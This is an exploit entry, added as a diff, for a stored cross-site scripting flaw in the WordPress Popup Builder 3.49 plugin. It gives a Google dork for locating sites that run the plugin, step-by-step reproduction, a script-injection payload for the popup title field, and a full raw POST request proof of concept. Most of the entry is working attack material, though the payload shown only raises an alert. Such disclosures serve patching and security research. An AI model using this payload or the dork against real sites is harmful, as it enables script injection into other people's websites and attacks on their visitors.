@@ -1,0 +1,44 @@
+# Exploit Title: Wordpress Popup Builder 3.49 - Persistent Cross-Site Scripting
+# Google Dork: inurl:"\wp-content\plugins\popupbuilder"
+# Date: 2019-06-13
+# Exploit Author: Unk9vvN
+# Vendor Homepage: https://popup-builder.com/
+# Software Link: https://wordpress.org/plugins/popup-builder/
+# Version: 3.49
+# Tested on: Kali Linux
+# CVE: N/A
+
+
+# Description
+# This vulnerability is in the validation mode and is located in "Add Post" or "Add Page" of wordpress and the vulnerability type is stored ,after install Popup Builder it will make section in Add Post  and Add Page . in this section you will choose which popup show it will create option tag with value of title of the popups, now its easy we just break option tag and insert our script tag inside popup title.
+
+1.Go to the 'Add new' section of Popup Builder
+2.Select Image type
+3.Enter the payload in the "add Title"
+4.Click the "Publish" option
+5.Go to Add New of Page section or Add New of Post section
+6.Your payload will run
+
+
+# URI: http://localhost/wordpress/wp-admin/post-new.php?post_type=popupbuilder&sgpb_type=image&wp-post-new-reload=true
+# Parameter & Payoad: post_title="/><script>alert("Unk9vvN")</script>
+
+
+#
+# POC
+#
+POST /wordpress/wp-admin/post.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/wordpress/wp-admin/post.php?post=39&action=edit
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 2425
+Cookie: ......
+Connection: close
+Upgrade-Insecure-Requests: 1
+DNT: 1
+
+_wpnonce=8dde4c5262&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fpost.php%3Fpost%3D39%26action%3Dedit%26message%3D1&user_ID=1&action=editpost&originalaction=editpost&post_author=1&post_type=popupbuilder&original_post_status=publish&referredby=http%3A%2F%2Flocalhost%2Fwordpress%2Fwp-admin%2Fpost.php%3Fpost%3D39%26action%3Dedit&_wp_original_http_referer=http%3A%2F%2Flocalhost%2Fwordpress%2Fwp-admin%2Fpost.php%3Fpost%3D39%26action%3Dedit&post_ID=39&meta-box-order-nonce=5e054a06d1&closedpostboxesnonce=03e898cf80&post_title=%22%2F%3E%3Cscript%3Ealert%28%22Unk9vvN%22%29%3C%2Fscript%3E&samplepermalinknonce=fc4f7ec2ab&wp-preview=&hidden_post_status=publish&post_status=publish&hidden_post_password=&hidden_post_visibility=public&visibility=public&post_password=&mm=09&jj=13&aa=2019&hh=15&mn=01&ss=34&hidden_mm=09&cur_mm=09&hidden_jj=13&cur_jj=13&hidden_aa=2019&cur_aa=2019&hidden_hh=15&cur_hh=15&hidden_mn=01&cur_mn=03&original_publish=Update&save=Update&tax_input%5Bpopup-categories%5D%5B%5D=0&newpopup-categories=New+Category+Name&newpopup-categories_parent=-1&_ajax_nonce-add-popup-categories=11ba2a6f5c&sgpb-image-url=http%3A%2F%2Flocalhost%2Fwordpress%2Fwp-content%2Fuploads%2F2019%2F09%2Fwp2601087.jpg&sgpb-target%5B0%5D%5B0%5D%5Bparam%5D=not_rule&sgpb-type=image&sgpb-is-preview=0&sgpb-is-active=checked&sgpb-events%5B0%5D%5B0%5D%5Bparam%5D=load&sgpb-events%5B0%5D%5B0%5D%5Bvalue%5D=&sgpb-behavior-after-special-events%5B0%5D%5B0%5D%5Bparam%5D=select_event&sgpb-popup-z-index=9999&sgpb-popup-themes=sgpb-theme-1&sgpb-overlay-custom-class=sgpb-popup-overlay&sgpb-overlay-color=&sgpb-overlay-opacity=0.8&sgpb-content-custom-class=sg-popup-content&sgpb-esc-key=on&sgpb-enable-close-button=on&sgpb-close-button-delay=0&sgpb-close-button-position=bottomRight&sgpb-button-position-top=&sgpb-button-position-right=9&sgpb-button-position-bottom=9&sgpb-button-position-left=&sgpb-button-image=&sgpb-button-image-width=21&sgpb-button-image-height=21&sgpb-border-color=%23000000&sgpb-border-radius=0&sgpb-border-radius-type=%25&sgpb-button-text=Close&sgpb-overlay-click=on&sgpb-popup-dimension-mode=responsiveMode&sgpb-responsive-dimension-measure=auto&sgpb-width=640px&sgpb-height=480px&sgpb-max-width=&sgpb-max-height=&sgpb-min-width=120&sgpb-min-height=&sgpb-open-animation-effect=No+effect&sgpb-close-animation-effect=No+effect&sgpb-enable-content-scrolling=on&sgpb-popup-order=0&sgpb-popup-delay=0&post_name=scriptalert1script
